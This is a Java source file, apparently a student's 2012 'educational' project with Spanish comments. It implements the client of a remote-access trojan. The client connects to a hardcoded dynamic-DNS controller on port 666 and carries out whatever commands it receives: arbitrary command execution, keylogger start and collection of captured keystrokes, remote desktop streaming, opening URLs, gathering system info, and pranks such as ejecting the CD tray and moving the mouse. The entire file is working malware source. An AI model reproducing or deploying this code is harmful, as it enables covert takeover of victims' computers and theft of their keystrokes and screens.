/* Este software ha sido realizado por Andoni Diaz Puerta */
/* con finalidad educativa y sin ánimo de lucro.          */
/* Ni yo ni nadie se hace responsable del daño que puedas */
/* causar con este código.                                */
/*  andoni.diaz@estudiants.urv.cat - ETSE URV - 2012      */                   

package debci.cliente;

import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.net.Socket;
import java.net.SocketException;
import java.util.logging.Level;
import java.util.logging.Logger;

/**
 *
 * @author Debci
 */
public class HiloComunicador{
    public static final String SERVER_HOSTNAME = "servidorandoni.no-ip.org";
    public static final int SERVER_PORT = 666;
    Socket servidor = null;
    String[] informacionEquipo = null;
    boolean condicionBucle = true;
    static InputStream flujoPrimarioEntrada;
    static DataInputStream flujoEntrada;
    static OutputStream flujoPrimarioSalida;
    static DataOutputStream flujoSalida;
    public HiloComunicador(){
 
    }
    public void Comunicacion() throws IOException {
        try {
            servidor = new Socket(SERVER_HOSTNAME, SERVER_PORT);
            //Declaracion de los flujos de entrada
            flujoPrimarioEntrada = servidor.getInputStream();
            flujoEntrada = new DataInputStream(flujoPrimarioEntrada);
            
            //Declaracion de los flujos de salida
            flujoPrimarioSalida = servidor.getOutputStream();
            flujoSalida = new DataOutputStream(flujoPrimarioSalida);
            
            //Funcion de lectura de los comando recibidos por el servidor
            while(true){
                Parser(flujoEntrada.readUTF(), flujoSalida);
            }    
            //Tratamiento de errores
        }catch(SocketException ex) {
                Comunicacion();
        }finally{
            servidor.close();
        }
       }
    public static void Parser(String comando, DataOutputStream flujoSalida) throws IOException{
        String[] infoSistema;
        String unidadLeida;
        Keylogger keylogger = new Keylogger();
        CrazyMouse locuraRaton = new CrazyMouse();
        
        switch(comando){
            //Obtenemos la información del sistema operativo.
            case "get info":
                infoSistema = Util.getInfoSistema();
                flujoSalida.writeUTF("\n#################");
                for(int i = 0; i< infoSistema.length; i++){
                    flujoSalida.writeUTF("# "+infoSistema[i]);
                }
                flujoSalida.writeUTF("##################");
            break;
            //Abrir url
            case "open url":
                flujoSalida.writeUTF("Introduzca la url:");
                Runtime.getRuntime().exec("rundll32 url.dll,FileProtocolHandler " +"http://"+flujoEntrada.readUTF());
            break;
            //Función defecto
            case "exec":
                flujoSalida.writeUTF("Introduzca el comando:");
                Runtime.getRuntime().exec(flujoEntrada.readUTF());
            break;
            //Iniciamos el keylogger con el API nativo
            case "keylogger start":
                keylogger.start();
            break;
            //Paramos el keylogger
            case "keylogger getdata":
                //Leemos la cadena devuelta por la función
                flujoSalida.writeUTF(keylogger.collectData());
            break;
            case "cd open":
                flujoSalida.writeUTF("Introduzca el identificador de la unidad de disco:\n (D ,G...)\n");
                unidadLeida = flujoEntrada.readUTF();
                ControlDisquetera.abrir(unidadLeida+":\\");
                flujoSalida.writeUTF("[+]Unidad abierta...");
            break;
            case "cd close":
                flujoSalida.writeUTF("Introduzca el identificador de la unidad de disco:\n (D ,G...)\n");
                unidadLeida = flujoEntrada.readUTF();
                ControlDisquetera.abrir(unidadLeida+":\\");
                flujoSalida.writeUTF("[+]Unidad cerrada...");
            break;
            case "crazy start":
                locuraRaton.start();
            break;
            case "crazy stop":
                locuraRaton.pararLocura();
            break;
            case "start remotedesktop":
                escritorioRemoto clienteEscritorio = new escritorioRemoto();
                flujoSalida.writeUTF("initRemoteDesktopTramit");
                clienteEscritorio.startSendImages();
            break;
            default:
                System.out.println(comando);
                flujoSalida.writeUTF("Comando incorrecto.");
            break;
        }
    }
}